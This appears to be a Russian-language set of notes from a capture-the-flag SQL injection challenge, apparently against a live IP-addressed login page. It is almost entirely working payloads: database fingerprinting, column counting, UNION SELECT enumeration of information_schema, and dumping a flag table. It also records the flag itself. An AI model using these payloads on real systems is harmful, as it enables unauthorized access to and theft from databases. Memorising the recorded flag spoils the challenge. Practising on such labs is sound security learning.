@@ -1,0 +1,43 @@
+url = http://185.204.109.119:65000/users/index.php
+
+
+# заметки
+
+1) 
+    Нужно выяснить какая БД используется:
+
+    admin'AND+(SELECT+banner+FROM+v$version)+--+. -> Понял что ORACLE DB не используется, ибо выдаёт ошибки
+
+    В отличии от такого запроса -> admin'AND+(SELECT+version())+--+.  
+    Возможно PostgreSQL, Microsoft или MySQL 
+
+    admin'AND+(SELECT+pg_sleep(10))+--+. -> Проверка на PostgreSQL выдаёт ошибку 
+    admin'AND+(WAITFOR+DELAY+'0:0:10')+--+. -> Проверка на Microsoft выдаёт ошибку
+
+
+    УБЕДИЛСЯ ЧТО ЭТО MySQL -> admin'AND+(SELECT+sleep(2))+--+.
+
+
+2) 
+    admin'+ORDER+BY+3+--+. -> Узнал что в текущей таблице 3 стобца
+
+    БД называется ramaza12_sql6 -> admin' UNION SELECT database(),NULL,NULL ORDER BY 1 DESC -- .
+
+
+    Понял что в БД 2 таблицы, users и flag:
+    admin' UNION SELECT TABLE_NAME,NULL,NULL FROM information_schema.tables WHERE TABLE_SCHEMA = "ramaza12_sql6"  -- .
+    admin' UNION SELECT TABLE_NAME,NULL,NULL FROM information_schema.tables WHERE TABLE_SCHEMA = "ramaza12_sql6" ORDER BY 1 DESC -- .
+
+
+    Узнал что в таблице flag 2 столбца id и name:
+    admin' UNION SELECT COLUMN_NAME,null,null FROM information_schema.columns WHERE table_name = 'flag' -- .
+
+
+3)
+    Нашёл флаг!
+
+    admin' UNION SELECT id,name,null FROM flag -- .
+
+
+    flag{549dda55e983af4e3380753f71dc2c1a}
+
